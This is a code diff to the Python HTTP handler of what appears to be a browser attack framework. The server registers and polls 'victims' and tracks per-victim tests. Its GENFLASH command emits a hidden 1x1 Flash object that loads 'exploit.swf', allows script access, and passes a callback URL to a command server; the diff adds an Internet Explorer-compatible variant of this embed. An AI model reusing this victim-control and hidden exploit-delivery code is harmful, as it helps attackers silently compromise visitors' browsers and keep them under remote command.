@@ -47,9 +47,10 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 					client_id = self.server.CALLER.registerVictim(self,client_ip)
 					return client_id
 		elif cmd=="POLL":
-			if len(cmd_parts)!=2:
-				self.server.log("Received invalid POLL command : " + command,2)
+			if len(cmd_parts)!=3:
+				self.server.log("Received invalid POLL command : " + command,0)
 			else:
+				#part[2] is random identifier, tobe discarded
 				client_id = cmd_parts[1].strip()
 				client = self.server.CALLER.getVictimByVictimId(client_id)
 				if client != None:
@@ -61,7 +62,7 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 				else:
 					self.server.log("Received POLL command for unknown client: " + command,4)
 		elif cmd=="ADD":
-			if len(cmd_parts)!=5:
+			if len(cmd_parts)!=6:
 				self.server.log("Received invalid ADD command : " + command,2)
 			else:
 				client_id = cmd_parts[1].strip()
@@ -79,7 +80,7 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 				else:
 					self.server.log("Received ADD command for unknown client:  " + command,4)
 		elif  cmd=="STATUS":
-			if len(cmd_parts)!= 2:
+			if len(cmd_parts)!= 3:
 				self.server.log("Received invalid STATUS command : " + command,2)
 			else:
 				test = self.server.CALLER.getVictimTest(cmd_parts[1].strip())
@@ -87,16 +88,22 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 					result = test.STATUS + " " + str(test.RESULT)
 				else:
 					result = "0"
-		elif cmd=="GENFLASH":
+		elif cmd=="GENFLASH" or cmd=="GENFLASHIE":
 			if len(cmd_parts)!= 3:
 				self.server.log("Received invalid GENFLASH command : " + command,2)
 			else:
-				result ="""<object width="1" height="1" data="exploit.swf" type="application/x-shockwave-flash" class="myclass" id="myid">
-						<param value="transparent" name="wmode">
-						<param value="allways" name="allowScriptAccess">
-						<param value="ci="""+cmd_parts[1]+"""&amp;server="""+cmd_parts[2].split(":")[0]+"""&amp;cmdURL=http://"""+cmd_parts[2]+"""/cli" name="FlashVars">
-					</object>
-			"""
+				result="""
+<object id="flash" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="1" height="1">
+	<param name="movie" value="exploit.swf">
+	<param name="quality" value="high">
+	<param name="AllowScriptAccess" value="always">
+	<param name="bgcolor" value="FFFFFF">
+	<param name="FlashVars" value="ci="""+cmd_parts[1]+"""&amp;server="""+cmd_parts[2].split(":")[0]+"""&amp;cmdURL=http://"""+cmd_parts[2]+"""/cli">
+	<param name="wmode" value="window">
+	<embed name="flash" src="exploit.swf" width="1" height="1" wmode="window" allowscriptaccess="always" bgcolor="FFFFFF" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" flashvars="ci="""+cmd_parts[1]+"""&amp;server="""+cmd_parts[2].split(":")[0]+"""&amp;cmdURL=http://"""+cmd_parts[2]+"""/cli">
+	</embed>
+</object>
+"""
 		elif cmd=="LIST":
 			if len(cmd_parts)!= 2:
 				self.server.log("Received invalid LIST command : " + command,2)
@@ -122,7 +129,7 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 			headerparts = request.split(" ")
 			if headerparts[0]=="GET":
 				_page = headerparts[1].replace("/","")
-				if _page =="": _page = "exploit.html"
+				if _page =="": _page = "admin.html"
 				self.server.log("Victim requested page: " + _page,3)
 		_page=_page.lower()
 		page = _page.split("?")[0];
@@ -153,13 +160,6 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 			respheader = respheader.replace("$cookie$",cookie)
 			self.send(respheader+body)
 			#self.send(body)
-	def getCommandServer(self):
-		result = None
-		for server in self.server.CALLER.SERVERS:
-			if server.TYPE=="Command Server":
-				result = server
-				break
-		return result
 #end class
 
 class Server(Base):
